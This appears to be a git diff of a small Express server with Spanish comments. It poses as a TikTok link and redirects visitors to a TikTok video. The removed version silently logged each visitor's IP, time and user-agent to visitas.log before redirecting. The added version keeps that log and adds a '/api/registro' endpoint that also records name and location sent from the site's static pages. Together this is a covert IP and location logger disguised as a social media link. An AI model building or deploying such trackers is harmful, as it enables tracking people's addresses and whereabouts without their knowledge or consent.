@@ -1,37 +1,54 @@
 const express = require('express');
 const fs = require('fs');
 const path = require('path');
-
 const app = express();
 const port = process.env.PORT || 3000;
 
-// Define los links de TikTok que quieres usar para redirigir
-const linksTikTok = {
-  reyganzo: 'https://www.tiktok.com/@reyganzo69/video/7482119548657732870?is_from_webapp=1&sender_device=pc'
-};
+// Servir archivos estáticos desde 'public'
+app.use(express.static('public'));
 
-app.get('/:codigo', (req, res) => {
-  const codigo = req.params.codigo || 'anonimo';
-  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
+// Middleware para interpretar JSON en requests POST
+app.use(express.json());
+
+// Ruta raíz: redirige a TikTok
+app.get('/', (req, res) => {
+  res.redirect('https://www.tiktok.com/@reyganzo69/video/7482119548657732870?is_from_webapp=1&sender_device=pc');
+});
+
+// Ruta para recibir datos de visitas
+app.post('/api/registro', (req, res) => {
+  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
   const hora = new Date().toISOString();
-  const navegador = req.headers['user-agent'] || 'Desconocido';
+  const { navegador, nombre, ubicacion } = req.body;
 
   const registro = {
-    codigo,
     ip,
     hora,
     navegador,
+    nombre,
+    ubicacion,
   };
 
-  fs.appendFile(path.join(__dirname, 'visitas.log'), JSON.stringify(registro) + '\n', err => {
-    if (err) {
-      console.error('Error guardando registro:', err);
+  // Guardar registro en archivo (añadiendo al final)
+  fs.appendFile(
+    path.join(__dirname, 'visitas.log'),
+    JSON.stringify(registro) + '\n',
+    err => {
+      if (err) {
+        console.error('Error guardando registro:', err);
+        return res.status(500).send('Error guardando registro');
+      }
+      res.send('Registro guardado');
     }
-    const destino = linksTikTok[codigo] || 'https://www.tiktok.com';
-    res.redirect(destino);
-  });
+  );
 });
 
+// Ruta para testear servidor vivo
+app.get('/test', (req, res) => {
+  res.send('Servidor está vivo y respondiendo!');
+});
+
+// Iniciar servidor
 app.listen(port, () => {
   console.log(`Servidor escuchando en http://localhost:${port}`);
 });
